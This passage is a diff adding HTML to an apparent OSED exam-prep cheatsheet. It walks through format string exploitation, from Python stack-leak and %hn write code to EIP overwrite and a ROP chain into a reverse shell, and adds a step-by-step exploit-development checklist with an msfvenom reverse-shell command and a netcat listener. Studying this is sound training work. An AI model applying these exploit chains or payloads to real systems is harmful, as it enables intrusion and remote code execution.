+# Alt+B to search for opcode sequences that look like diagnostic trampolines
+# Check the .data section for function pointer tables (vtables, dispatch tables)
+# WinDbg: enumerate all exported symbols matching a pattern
+x target!*debug*
+x target!*diag*
+# If a function takes a command code and dispatches via a table, that table
+# may contain unexported functions with useful primitives (e.g. arbitrary read/write)</code></pre>
+
+
+              <h2 id="osed-format-string">12. Format String Attacks</h2>
+              <p>When user input reaches a <code>printf</code>-family function as the <em>format string</em> itself, the format specifiers read from and write to memory &mdash; giving you both an info leak (defeats ASLR) and an arbitrary write.</p>
+              <h3 id="osed-fstr-theory">12.1 Format String Theory</h3>
+              <p>The vulnerability lives in C/C++ code where attacker-controlled data reaches a printf-family function as the first argument instead of as a data argument. <code>printf(user_input)</code> is exploitable; <code>printf("%s", user_input)</code> is not. Probe by sending <code>%x %x %x %x %x %x %x %x</code> &mdash; if the server reflects hex values from the stack, format string injection is confirmed.</p>
+              <pre><code class="language-bash"># Vulnerable pattern (C source):
+# printf(user_input);            // BAD: user_input IS the format string
+# Safe pattern:
+# printf("%s", user_input);      // GOOD: user_input is a data argument
+
+# Test: send "%x %x %x %x %x %x %x %x" and look for hex values in the response
+# If the server reflects the stack values, format string vulnerability is confirmed</code></pre>
+              <h3 id="osed-fstr-specifiers">12.2 Format Specifier Cheat Sheet</h3>
+              <table class="custom-table">
+                <thead><tr><th>Specifier</th><th>Size</th><th>Primitive</th></tr></thead>
+                <tbody>
+                  <tr><td><code>%x</code></td><td>4 bytes</td><td>Read stack value as unsigned hex &mdash; leak addresses (defeat ASLR)</td></tr>
+                  <tr><td><code>%p</code></td><td>pointer</td><td>Read stack value as pointer &mdash; same as %x, more portable</td></tr>
+                  <tr><td><code>%s</code></td><td>*</td><td>Dereference stack value as string pointer &mdash; arbitrary read</td></tr>
+                  <tr><td><code>%d</code></td><td>4 bytes</td><td>Read stack value as signed int</td></tr>
+                  <tr><td><code>%n</code></td><td>4 bytes</td><td><strong>Write</strong> the number of bytes printed so far to the pointed-to address</td></tr>
+                  <tr><td><code>%hn</code></td><td>2 bytes</td><td>Write 2-byte (short) value &mdash; use two <code>%hn</code> for a full DWORD write</td></tr>
+                  <tr><td><code>%hhn</code></td><td>1 byte</td><td>Write 1-byte value &mdash; four <code>%hhn</code> for a full DWORD</td></tr>
+                  <tr><td><code>%N$x</code></td><td>4 bytes</td><td>Direct parameter access &mdash; read the Nth argument without consuming prior ones</td></tr>
+                  <tr><td><code>%Nx</code></td><td>4 bytes</td><td>Print N characters &mdash; controls the byte count that <code>%n</code> will write</td></tr>
+                </tbody>
+              </table>
+              <h3 id="osed-fstr-leak">12.3 ASLR Bypass via Format String Leak (Part I)</h3>
+              <p>Send incrementing <code>%N$x</code> payloads to identify which stack offset holds a useful pointer (a return address into a module or a saved frame pointer into the stack). Subtract the known offset-within-module (from IDA) to recover the module base, then rebase every gadget address.</p>
+              <pre><code class="language-python">import socket, struct
+
+TARGET = ("192.168.X.Y", 11460)
+
+def send_fmt(payload: bytes) -&gt; bytes:
+    with socket.create_connection(TARGET) as s:
+        s.send(payload)
+        return s.recv(4096)
+
+# Probe stack offsets 1-50 looking for module-range pointers
+for n in range(1, 50):
+    fmt = f"%{n}$x".encode()
+    resp = send_fmt(build_packet(fmt))  # wrap in protocol packet
+    val = parse_response(resp)
+    if val:
+        print(f"  offset {n:2d}: 0x{val:08x}")
+        # If 0x004xxxxx or 0x6fxxxxxx -&gt; likely a code pointer
+
+# Once you identify the offset holding a code pointer:
+def leak_aslr(offset: int) -&gt; int:
+    fmt = f"%{offset}$x".encode()
+    resp = send_fmt(build_packet(fmt))
+    return int(parse_response(resp), 16)
+
+leaked = leak_aslr(22)               # e.g. offset 22 held a kernel32 pointer
+module_base = leaked - 0x000a1234    # subtract the static offset-in-module (from IDA)
+print(f"[+] Module base: 0x{module_base:08x}")</code></pre>
+              <h3 id="osed-fstr-write">12.4 Write Primitive with <code>%n</code> (Part II)</h3>
+              <p>The <code>%n</code> specifier writes the number of bytes printed so far into the address pointed to by the corresponding argument. By carefully crafting the format string &mdash; place the target address on the stack, inflate the byte count with width specifiers, and write 2 bytes at a time with <code>%hn</code> &mdash; you can write any 4-byte value to any writable address.</p>
+              <pre><code class="language-python"># Strategy: write value V to address A
+# - Place A on the stack (it will be the pointer %n reads)
+# - Use field-width padding (%Wx) to inflate the printed byte count to V
+# - Use %hn twice (two 2-byte writes) to avoid overflow with very large values
+
+def write_dword(addr: int, value: int) -&gt; bytes:
+    """Build a format string that writes 'value' to 'addr' via %n."""
+    lo = value &amp; 0xFFFF          # lower 2 bytes
+    hi = (value &gt;&gt; 16) &amp; 0xFFFF  # upper 2 bytes
+
+    # Place addr (lo half) and addr+2 (hi half) on the stack
+    targets = struct.pack("&lt;I", addr) + struct.pack("&lt;I", addr + 2)
+
+    # Calculate padding to reach each target value
+    # Assumes targets are at stack offset N (determine experimentally)
+    stack_offset_lo = 22   # adjust per target
+    stack_offset_hi = 23
+
+    # Build: print (lo) bytes for low half, write %hn, then print more for high half
+    already_printed = len(targets)
+    pad_lo = (lo - already_printed) % 0x10000
+    pad_hi = (hi - lo) % 0x10000
+
+    fmt  = targets
+    fmt += f"%{pad_lo}x".encode() if pad_lo &gt; 0 else b""
+    fmt += f"%{stack_offset_lo}$hn".encode()
+    fmt += f"%{pad_hi}x".encode() if pad_hi &gt; 0 else b""
+    fmt += f"%{stack_offset_hi}$hn".encode()
+    return fmt</code></pre>
+              <h3 id="osed-fstr-eip">12.5 Overwriting EIP &amp; Redirecting Execution</h3>
+              <p>Target a saved return address on the stack, a function pointer in a dispatch table, a GOT/IAT entry, or an SEH handler pointer. Find the target&rsquo;s address via IDA (static offset) adjusted with the ASLR-leaked base, then overwrite with the address of a ROP gadget or shellcode stub.</p>
+              <pre><code class="language-python"># In the EXP-301 course: overwrite saved EIP on the server's stack
+# Located by tracing the function call chain and measuring the frame depth.
+
+# After ASLR bypass leak + write primitive:
+target_eip_addr = leaked_stack_base + SAVED_EIP_OFFSET  # stack addr of saved EIP
+new_eip = module_base + ROP_CHAIN_GADGET_OFFSET         # start of our ROP chain
+
+write_fmt = write_dword(target_eip_addr, new_eip)
+send_fmt(build_packet(write_fmt))</code></pre>
+              <h3 id="osed-fstr-pivot">12.6 Stack Pivot for ROP After Format String</h3>
+              <p>After overwriting EIP with a gadget, ESP needs to point at your ROP chain. If it doesn&rsquo;t already land on controllable data, use a stack pivot &mdash; <code>XCHG EAX, ESP; RET</code> when EAX points to your chain, <code>ADD ESP, N; RET</code> to move into a different region, or <code>LEA ESP, [EAX+N]; RET</code> for a register-relative redirect.</p>
+              <pre><code class="language-nasm">; Stack pivot gadgets:
+xchg eax, esp ; ret     ; swap EAX (controlled) with ESP, then RET pops from new stack
+add  esp, 0x200 ; ret   ; move ESP into a different region
+lea  esp, [eax+0x8] ; ret  ; set ESP to controlled register + offset
+sub  esp, 0x40 ; ret    ; move ESP backward into the buffer
+
+; Technique: ensure EAX or another register points to your ROP chain payload
+; Then use XCHG EAX,ESP to redirect the stack there, and the chain executes.</code></pre>
+              <h3 id="osed-fstr-rce">12.7 Getting Code Execution (Full Chain)</h3>
+              <p>Combine the leak, the write primitive, and the ROP chain in a single script. Send a request that gets the server to log a format string you control, leak a code pointer via <code>%N$x</code>, compute the module base, calculate the saved-EIP address, write the ROP chain start there with <code>%hn</code>, and trigger the function&rsquo;s return &mdash; the ROP chain calls VirtualAlloc/WriteProcessMemory and returns into shellcode.</p>
+              <pre><code class="language-python">"""
+Full format string exploit chain (EXP-301 style):
+1. Send a request that causes the server to log a format string we control.
+2. Leak the ASLR offset: send %N$x payloads and identify a code pointer.
+3. Compute module base from the leaked pointer.
+4. Compute the target address (saved EIP in the logging function's frame).
+5. Write our ROP chain address to the saved EIP using %hn write primitive.
+6. The next request causes the function to return -&gt; EIP = our ROP chain start.
+7. ROP chain calls VirtualAlloc or WriteProcessMemory to mark shellcode executable.
+8. ROP chain returns into shellcode -&gt; reverse shell.
+"""
+def exploit():
+    # Stage 1: Leak
+    leaked = leak_aslr(LEAK_OFFSET)
+    base   = leaked - KNOWN_OFFSET_IN_MODULE
+
+    # Stage 2: Compute addresses
+    rop_start = base + ROP_CHAIN_RVA    # first gadget of our chain
+    saved_eip = leak_stack_addr()       # also leak saved EIP address via %s / %p
+
+    # Stage 3: Write
+    write_fmt = write_dword(saved_eip, rop_start)
+    send_request(build_packet(write_fmt))
+
+    # Stage 4: Trigger
+    trigger_request()   # causes the function to return, executing our ROP chain
+    print("[+] Reverse shell triggered")</code></pre>
+
+
+              <h2 id="methodology">13. Methodology</h2>
+              <p>A repeatable, exam-ready workflow from receiving a closed-source binary to a documented, reliable reverse shell. Complete each stage fully before advancing &mdash; a skipped step here causes a silent failure two steps later. Keep a running PoC Python script that you extend at each stage; version-control it or at minimum save snapshots.</p>
+
+              <h3 id="methodology-preexam">13.1 Pre-Exam Setup</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-preexam-vm"> Boot Windows 10 x86 VM (DEP and ASLR on, do NOT disable them)</li>
+                <li><input type="checkbox" data-id="d-preexam-windbg"> Open WinDbg and confirm symbol server is set: <code>.sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols</code></li>
+                <li><input type="checkbox" data-id="d-preexam-pykd"> Load pykd: <code>.load pykd</code>; run a sanity script to confirm it works</li>
+                <li><input type="checkbox" data-id="d-preexam-tools"> Confirm Kali tools accessible: <code>msf-pattern_create</code>, <code>msfvenom</code>, <code>msf-nasm_shell</code>, <code>ropper</code>/<code>rp++</code></li>
+                <li><input type="checkbox" data-id="d-preexam-ida"> Open target binary in IDA Pro (or Ghidra); run auto-analysis; wait for completion before starting any RE work</li>
+                <li><input type="checkbox" data-id="d-preexam-template"> Prepare your Python exploit skeleton template (imports, send wrapper, struct.pack helper)</li>
+                <li><input type="checkbox" data-id="d-preexam-nc"> Start a Netcat listener: <code>nc -lvnp 443</code></li>
+                <li><input type="checkbox" data-id="d-preexam-snapshot"> Snapshot the VM before touching the target service (easy revert for testing)</li>
+              </ul>
+
+              <h3 id="methodology-recon">13.2 Target Recon &amp; Enumeration</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-recon-port"> Identify the listening port(s): <code>netstat -ano</code>, <code>nmap -sV -p- 127.0.0.1</code></li>
+                <li><input type="checkbox" data-id="d-recon-proto"> Determine the protocol: TCP, UDP, HTTP, custom binary. Send a manual request and observe the response.</li>
+                <li><input type="checkbox" data-id="d-recon-strings"> Run <code>strings target.exe | grep -iE "recv|read|listen|bind|version|author"</code> for quick clues</li>
+                <li><input type="checkbox" data-id="d-recon-imports"> In IDA/Ghidra, check the Imports tab: identify <code>recv</code>, <code>WSARecv</code>, <code>ReadFile</code>, <code>fgets</code>, <code>scanf</code> (input functions), and <code>strcpy</code>, <code>memcpy</code>, <code>sprintf</code> (copy sinks)</li>
+                <li><input type="checkbox" data-id="d-recon-protections"> Check module protections: <code>!py mona modules</code>. Note which modules are non-ASLR and non-SafeSEH &mdash; all gadgets and return addresses will come from here.</li>
+                <li><input type="checkbox" data-id="d-recon-dep"> Confirm DEP: <code>!vprot esp</code> &mdash; if not PAGE_EXECUTE*, DEP is active on the stack.</li>
+                <li><input type="checkbox" data-id="d-recon-version"> Record exact Windows version: <code>winver</code> / <code>ver</code>. Egghunter syscall numbers differ by version.</li>
+              </ul>
+
+              <h3 id="methodology-reverse">13.3 Reverse Engineering the Binary</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-re-entry"> In IDA/Ghidra: locate <code>recv</code> / <code>WSARecv</code> in the Imports tab; press <kbd>X</kbd> to see all call sites. Start here &mdash; this is where attacker data enters.</li>
+                <li><input type="checkbox" data-id="d-re-hook"> In WinDbg: hook <code>recv</code> with a breakpoint-action: <code>bp ws2_32!recv "da poi(esp+8) L?400; g"</code>. Send a known test string and confirm it lands in the breakpoint dump.</li>
+                <li><input type="checkbox" data-id="d-re-sync"> Synchronize WinDbg with IDA: compute <code>runtime_addr = runtime_base + (IDA_addr - IDA_imagebase)</code>. Set matching breakpoints in both to walk in parallel.</li>
+                <li><input type="checkbox" data-id="d-re-trace"> In IDA: follow the tainted buffer from <code>recv</code> downstream through cross-references (<kbd>X</kbd>). Rename every function you understand as you go.</li>
+                <li><input type="checkbox" data-id="d-re-decompile"> Use the decompiler (F5 in IDA / Ghidra decompiler pane) to understand complex parsing loops. Watch for length fields copied without bounds checking.</li>
+                <li><input type="checkbox" data-id="d-re-checksum"> If the protocol has a checksum or magic bytes: reverse-engineer the algorithm and implement it in Python so your exploit packets pass validation.</li>
+                <li><input type="checkbox" data-id="d-re-overflow"> Identify the exact vulnerable function: which <code>memcpy</code>/<code>strcpy</code>/<code>sprintf</code> takes an attacker-controlled length or unchecked string? Note the destination buffer address and size from the stack frame.</li>
+                <li><input type="checkbox" data-id="d-re-class"> Classify the bug: direct EIP overwrite (stack overflow), SEH overwrite, write-what-where, or format string?</li>
+              </ul>
+
+              <h3 id="methodology-crash">13.4 Crash Triage</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-crash-fuzz"> Build a minimal fuzzer: send increasing buffer sizes (100, 200, 400 &hellip; 5000 bytes) until the service crashes with EIP = <code>41414141</code>.</li>
+                <li><input type="checkbox" data-id="d-crash-windbg"> Capture the fault state in WinDbg: <code>r</code> (registers), <code>!exchain</code> (SEH), <code>db esp L40</code> (stack), <code>u eip</code> (code at crash).</li>
+                <li><input type="checkbox" data-id="d-crash-class"> Confirm the crash class:
+                  <ul>
+                    <li><strong>Stack overflow:</strong> EIP = <code>41414141</code>, ESP points into your buffer</li>
+                    <li><strong>SEH overflow:</strong> EIP = <code>7c802898</code> (OS handler dispatch), <code>!exchain</code> shows <code>41414141</code></li>
+                    <li><strong>Format string:</strong> EIP unchanged but memory reads/writes reflect your specifiers</li>
+                  </ul>
+                </li>
+                <li><input type="checkbox" data-id="d-crash-repro"> Build a minimal, reliable reproduction script that crashes the target cleanly and consistently.</li>
+                <li><input type="checkbox" data-id="d-crash-restart"> Confirm the target restarts cleanly after a crash (or understand how to restart it). The exam scoring depends on reliable exploitation, not one-shot luck.</li>
+              </ul>
+
+              <h3 id="methodology-control">13.5 Gaining EIP / SEH Control</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-ctrl-pattern"> Generate a cyclic pattern: <code>msf-pattern_create -l 3000</code>. Send it as the payload.</li>
+                <li><input type="checkbox" data-id="d-ctrl-offset"> Read EIP (stack overflow) or <code>!exchain</code> SEH value from WinDbg. Run <code>msf-pattern_offset -l 3000 -q &lt;value&gt;</code> to get the exact byte offset.</li>
+                <li><input type="checkbox" data-id="d-ctrl-confirm"> Confirm control: send <code>A*offset + B*4</code>. EIP or SEH must read exactly <code>42424242</code>. Check <code>db esp L16</code> to see what follows.</li>
+                <li><input type="checkbox" data-id="d-ctrl-space"> Measure shellcode space: from ESP forward (or from the A-buffer before EIP), count bytes until a null or end of buffer. Decision tree:
+                  <ul>
+                    <li>&ge;&nbsp;400 bytes at ESP &rarr; direct shellcode after EIP</li>
+                    <li>&lt;&nbsp;400 bytes but large earlier buffer &rarr; egghunter after EIP, real shellcode in A-buffer</li>
+                    <li>Protocol delivers multiple packets &rarr; send shellcode in earlier packet to heap, egghunt for it</li>
+                  </ul>
+                </li>
+              </ul>
+
+              <h3 id="methodology-badchars">13.6 Bad Character Enumeration</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-bc-gen"> Send <code>A*offset + B*4 + bytes(\x01..\xff)</code> (all bytes except <code>\x00</code>).</li>
+                <li><input type="checkbox" data-id="d-bc-compare"> In WinDbg: <code>db esp L100</code>. The sequence should read <code>01 02 03 04 ...</code>. Where it breaks or skips, that byte is bad.</li>
+                <li><input type="checkbox" data-id="d-bc-mona"> Use mona to automate comparison: <code>!py mona bytearray -b "\x00"</code> then <code>!py mona compare -f bytearray.bin -a esp</code>.</li>
+                <li><input type="checkbox" data-id="d-bc-iterate"> Remove the confirmed bad character from the test array and repeat. One bad char can hide the next &mdash; iterate until the full array lands clean.</li>
+                <li><input type="checkbox" data-id="d-bc-record"> Record the final bad char list. Every address byte and shellcode byte must avoid all entries in this list.</li>
+                <li><input type="checkbox" data-id="d-bc-usual"> Double-check common culprits: <code>\x00</code>, <code>\x0a</code>, <code>\x0d</code>; also protocol-specific: <code>\x20</code> (space), <code>\x2f</code> (/), <code>\x26</code> (&amp;), <code>\x3d</code> (=).</li>
+              </ul>
+
+              <h3 id="methodology-return">13.7 Return Address &amp; SEH Gadget Selection</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-ret-module"> From <code>!py mona modules</code>, pick a module with <code>ASLR=False</code> (and <code>SafeSEH=False</code> for SEH exploits). Prefer application DLLs over OS DLLs.</li>
+                <li><input type="checkbox" data-id="d-ret-search"> Search for <code>JMP ESP</code> (stack) or <code>POP POP RET</code> (SEH) within the chosen module.</li>
+                <li><input type="checkbox" data-id="d-ret-badchar"> Verify the address bytes contain no bad characters. Try multiple candidates if the first fails.</li>
+                <li><input type="checkbox" data-id="d-ret-verify"> Set a breakpoint at the chosen address in WinDbg and confirm execution lands there when the exploit fires.</li>
+                <li><input type="checkbox" data-id="d-ret-seh-nseh"> For SEH: after POP/POP/RET lands at nSEH, confirm the short jump takes you to the shellcode NOP sled. Adjust nSEH jump offset if needed.</li>
+              </ul>
+
+              <h3 id="methodology-shellcode">13.8 Shellcode Staging</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-sc-gen"> Generate shellcode: <code>msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=Y -f python -e x86/shikata_ga_nai -b "&lt;badchars&gt;"</code></li>
+                <li><input type="checkbox" data-id="d-sc-size"> Confirm shellcode fits in the available space (shikata adds ~25 bytes overhead; allow buffer for NOP sled).</li>
+                <li><input type="checkbox" data-id="d-sc-nops"> Prepend a 16-byte NOP sled (<code>\x90*16</code>) before shellcode for reliability against minor stack position variance.</li>
+                <li><input type="checkbox" data-id="d-sc-test"> Test shellcode works: temporarily disable DEP if needed to confirm the payload logic before tackling mitigation bypass.</li>
+                <li><input type="checkbox" data-id="d-sc-egg"> If using egghunter: build the egg tag (<code>b"w00tw00t"</code> = 8 bytes) prefix, deliver it in the large buffer, and send the egghunter in the small-space buffer. Confirm the hunter finds the egg.</li>
+                <li><input type="checkbox" data-id="d-sc-seheg"> For SEH-based egghunter on Windows 10: use the SEH-based variant; test on both Windows 7 and 10 if possible.</li>
+              </ul>
+
+              <h3 id="methodology-dep">13.9 Defeating DEP (ROP)</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-dep-confirm"> Confirm DEP is active: <code>!vprot esp</code> shows <code>PAGE_READWRITE</code> (no execute).</li>
+                <li><input type="checkbox" data-id="d-dep-gadgets"> Enumerate gadgets from non-ASLR module: <code>rp-win-x86.exe -f target.dll --rop 5 --unique &gt; gadgets.txt</code></li>
+                <li><input type="checkbox" data-id="d-dep-api"> Choose your API target:
+                  <ul>
+                    <li><code>VirtualAlloc</code> &rarr; allocate RWX memory, copy shellcode, jump in</li>
+                    <li><code>VirtualProtect</code> &rarr; mark existing stack page executable</li>
+                    <li><code>WriteProcessMemory</code> &rarr; copy shellcode into an existing code section</li>
+                  </ul>
+                </li>
+                <li><input type="checkbox" data-id="d-dep-chain"> Build the ROP chain: find gadgets to set up each API argument in registers/stack. Use PUSHAD if available to batch the call frame in one shot.</li>
+                <li><input type="checkbox" data-id="d-dep-iat"> Dereference the IAT to get the runtime API address (avoids hardcoding a possibly-ASLR-shifted address).</li>
+                <li><input type="checkbox" data-id="d-dep-pivot"> If ESP doesn&rsquo;t land on your ROP chain, insert a stack pivot gadget (<code>XCHG EAX,ESP;RET</code> or <code>ADD ESP,N;RET</code>).</li>
+                <li><input type="checkbox" data-id="d-dep-encode"> If remaining bad chars still hit shellcode: XOR-encode the shellcode and add a ROP decoder stub that writes decoded bytes to the RWX region before jumping in.</li>
+                <li><input type="checkbox" data-id="d-dep-test"> Test: set a breakpoint at the start of your ROP chain in WinDbg, single-step through each gadget, confirm the API call fires with correct arguments, and confirm EAX returns the expected address.</li>
+              </ul>
+
+              <h3 id="methodology-aslr">13.10 Defeating ASLR</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-aslr-check"> Run <code>!py mona modules</code> &mdash; if ANY module has <code>ASLR=False</code>, use it for all gadget/return addresses. Skip the leak step.</li>
+                <li><input type="checkbox" data-id="d-aslr-leak"> If all modules are ASLR-enabled: look for an information disclosure (format string, over-read). Identify which stack or heap offset holds a code pointer belonging to a known module.</li>
+                <li><input type="checkbox" data-id="d-aslr-fmtprobe"> For format string targets: send <code>%1$x %2$x ... %60$x</code> incrementally until you see values that fall within a loaded module&rsquo;s expected range.</li>
+                <li><input type="checkbox" data-id="d-aslr-base"> Compute the module base: <code>leaked_addr - (IDA_static_addr - IDA_imagebase)</code>. Confirm it is page-aligned (<code>&amp; 0xFFF == 0</code>).</li>
+                <li><input type="checkbox" data-id="d-aslr-rebase"> Rebase all gadget addresses: <code>gadget_runtime = module_base + (gadget_IDA_addr - IDA_imagebase)</code></li>
+                <li><input type="checkbox" data-id="d-aslr-partial"> Partial overwrite option: if overflow is null-terminated before reaching 4 bytes, write 1&ndash;2 low bytes to redirect EIP within the same page as the current return address.</li>
+                <li><input type="checkbox" data-id="d-aslr-stack"> Stack ASLR: the stack base also varies. A stack address leaked via format string is needed for any stack-relative write target. Save both module and stack leaks before computing final addresses.</li>
+              </ul>
+
+              <h3 id="methodology-format-string">13.11 Format String Exploit Workflow</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-fmt-confirm"> Confirm the format string injection point: send <code>AAAA %x %x %x %x %x</code> and look for <code>41414141</code> in the response at a predictable offset.</li>
+                <li><input type="checkbox" data-id="d-fmt-offset"> Determine the stack offset where your input appears: <code>AAAA %1$x</code>, <code>AAAA %2$x</code>, &hellip; until you see <code>41414141</code>. That is your &ldquo;write offset&rdquo;.</li>
+                <li><input type="checkbox" data-id="d-fmt-leak"> Use <code>%N$x</code> at higher offsets to leak code and stack pointers for ASLR bypass.</li>
+                <li><input type="checkbox" data-id="d-fmt-target"> Identify the write target: saved EIP in the vulnerable function&rsquo;s stack frame, an SEH record, or a function pointer in a dispatch table.</li>
+                <li><input type="checkbox" data-id="d-fmt-write"> Use <code>%hn</code> (two 2-byte writes) to overwrite the target with your ROP chain start address. Test with a known benign value first (<code>0xdeadbeef</code>) to confirm the write works before overwriting EIP.</li>
+                <li><input type="checkbox" data-id="d-fmt-rop"> After EIP redirection, the ROP chain must also handle DEP (if active). Combine leak + write + ROP chain in one script.</li>
+              </ul>
+
+              <h3 id="methodology-reliability">13.12 Reliability &amp; Finalization</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-rel-restart"> Test the exploit across at least 3 fresh VM reboots (ASLR changes bases; confirm your leak-and-rebase logic is correct every time).</li>
+                <li><input type="checkbox" data-id="d-rel-timing"> If the exploit depends on timing (async recv, race condition): add a small delay or retry loop; never rely on a single-attempt &ldquo;lucky shot&rdquo;.</li>
+                <li><input type="checkbox" data-id="d-rel-nop"> Increase or decrease the NOP sled if the shellcode crashes intermittently. Verify ESP points to your NOPs at the JMP ESP moment in WinDbg.</li>
+                <li><input type="checkbox" data-id="d-rel-badchar"> Final check: dump the memory region containing your shellcode from WinDbg (<code>db esp L300</code>); manually scan for any bad char bytes in your shellcode or ROP chain.</li>
+                <li><input type="checkbox" data-id="d-rel-dep-stack"> For DEP bypass: confirm the allocated RWX region is actually marked executable (<code>!vprot &lt;new_region&gt;</code> should show <code>PAGE_EXECUTE_READWRITE</code>).</li>
+                <li><input type="checkbox" data-id="d-rel-aslr-leak"> For ASLR bypass: confirm the base calculation is correct: <code>leaked_val - offset == multiple of 0x1000</code>. If the base is mis-aligned, the offset calculation is wrong.</li>
+                <li><input type="checkbox" data-id="d-rel-clean"> Clean up the exploit script: remove debugging prints, ensure all hardcoded offsets are labeled with comments. The script must be self-explanatory for the examiner.</li>
+              </ul>
+
+              <h3 id="methodology-proof">13.13 Proof &amp; Documentation</h3>
+              <ul>
+                <li><input type="checkbox" data-id="d-proof-shell"> Run the exploit, receive the reverse shell, and run <code>whoami</code>, <code>ipconfig</code>, <code>hostname</code>. Screenshot all three commands in the same shell window.</li>
+                <li><input type="checkbox" data-id="d-proof-txt"> Find and display <code>proof.txt</code> or the designated proof file: <code>type C:\Users\Administrator\Desktop\proof.txt</code>. Screenshot it alongside your IP.</li>
+                <li><input type="checkbox" data-id="d-proof-script"> Screenshot the full exploit script running and the shell opening. Include the WinDbg output showing the crash, your mitigation bypass, and the final RET into shellcode.</li>
+                <li><input type="checkbox" data-id="d-proof-offsets"> Document in your script comments: the vulnerability type, offset to EIP/nSEH, bad characters, return address with module name, gadget addresses with source module, and shellcode generation command.</li>
+                <li><input type="checkbox" data-id="d-proof-cleanup"> Remove any test files (dropped payloads, webshells) you placed during exploitation.</li>
+              </ul>
+
+              <h2 id="references">14. References</h2>
+              <p>[1] Microsoft, &quot;Debugging Tools for Windows (WinDbg),&quot; [Online]. Available: <a href="https://learn.microsoft.com/windows-hardware/drivers/debugger/" target="_blank" rel="noopener noreferrer">learn.microsoft.com &mdash; WinDbg</a>.</p>
+              <p>[2] Corelan, &quot;Exploit Writing Tutorial series (Stack, SEH, Egghunters, ROP),&quot; [Online]. Available: <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">https://www.corelan.be/index.php/articles/</a>.</p>
+              <p>[3] nop-tech, &quot;OSED Notes, practice binaries and solutions,&quot; [Online]. Available: <a href="https://github.com/nop-tech/OSED" target="_blank" rel="noopener noreferrer">https://github.com/nop-tech/OSED</a>.</p>
+              <p>[4] Darksidesfear, &quot;OSED-CheatSheet,&quot; [Online]. Available: <a href="https://github.com/Darksidesfear/OSED-CheatSheet" target="_blank" rel="noopener noreferrer">https://github.com/Darksidesfear/OSED-CheatSheet</a>.</p>
+              <p>[5] mrtouch93, &quot;OSED-Notes,&quot; [Online]. Available: <a href="https://github.com/mrtouch93/OSED-Notes" target="_blank" rel="noopener noreferrer">https://github.com/mrtouch93/OSED-Notes</a>.</p>
+              <p>[6] Spaceraccoon, &quot;ROP and Roll: EXP-301 / OSED Review,&quot; [Online]. Available: <a href="https://spaceraccoon.dev/rop-and-roll-exp-301-offensive-security-exploit-development-osed-review-and/" target="_blank" rel="noopener noreferrer">spaceraccoon.dev &mdash; OSED Review</a>.</p>
+              <p>[7] sashs, &quot;Ropper &mdash; ROP gadget finder,&quot; [Online]. Available: <a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener noreferrer">https://github.com/sashs/Ropper</a>.</p>
+              <p>[8] Keystone Engine, &quot;Assembler Framework,&quot; [Online]. Available: <a href="https://www.keystone-engine.org/" target="_blank" rel="noopener noreferrer">https://www.keystone-engine.org/</a>.</p>
+              <p>[9] NSA / National Security Agency, &quot;Ghidra &mdash; Software Reverse Engineering Framework,&quot; [Online]. Available: <a href="https://ghidra-sre.org/" target="_blank" rel="noopener noreferrer">https://ghidra-sre.org/</a>.</p>
+              <p>[10] Hovav Shacham, &quot;The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86),&quot; CCS 2007. Available: <a href="https://hovav.net/ucsd/dist/geometry.pdf" target="_blank" rel="noopener noreferrer">hovav.net/ucsd/dist/geometry.pdf</a>.</p>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Cheatsheet Section -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Index ======= -->
+  <div class="index-btn" onclick="toggleIndex()">Index</div>
+  <div id="index" class="index">
+    <div class="container mt-3">
+      <div class="input-group mb-3">
+        <input type="text" id="search-input" class="form-control" placeholder="Search sections..." aria-label="Search sections" aria-describedby="search-button">
+        <button class="btn btn-primary" type="button" id="search-button">
+          <i class="bi bi-search"></i>
+        </button>
+      </div>
+    </div>
+    <button class="expand-collapse-btn" onclick="toggleAll()">Show/Hide All</button>
+
+    <div class="section-flow-1">
+      <button class="dropdown-btn">1. Tools &amp; Setup
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#osed-lab-setup">1.1 Lab &amp; Debugger Setup</a>
+        <a href="#osed-tool-table">1.2 Tool Reference</a>
+      </div>
+    </div>
+    <div class="section-flow-2">
+      <button class="dropdown-btn">2. x86 Architecture
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#osed-memory-layout">2.1 Program Memory Layout</a>
+        <a href="#osed-registers">2.2 CPU Registers</a>
+        <a href="#osed-stack">2.3 Stack &amp; Calling Conventions</a>
+        <a href="#osed-instructions">2.4 Common Instructions</a>
+      </div>
+    </div>
+    <div class="section-flow-3">
+      <button class="dropdown-btn">3. Debugging
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#osed-windbg-nav">3.1 Navigation &amp; Execution</a>
+        <a href="#osed-windbg-bp">3.2 Breakpoints &amp; Actions</a>
+        <a href="#osed-windbg-hw">3.3 Hardware Breakpoints</a>
+        <a href="#osed-windbg-mem">3.4 Accessing &amp; Manipulating Memory</a>
+        <a href="#osed-windbg-search">3.5 Searching Memory</a>
+        <a href="#osed-windbg-calc">3.6 Registers &amp; Calculator</a>
+        <a href="#osed-windbg-modules">3.7 Listing Modules &amp; Symbols</a>
+        <a href="#osed-windbg-pseudo">3.8 Pseudo Registers</a>
+        <a href="#osed-windbg-pykd">3.9 pykd Scripting</a>
+      </div>
+    </div>
+    <div class="section-flow-4">
+      <button class="dropdown-btn">4. Stack Buffer Overflows
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
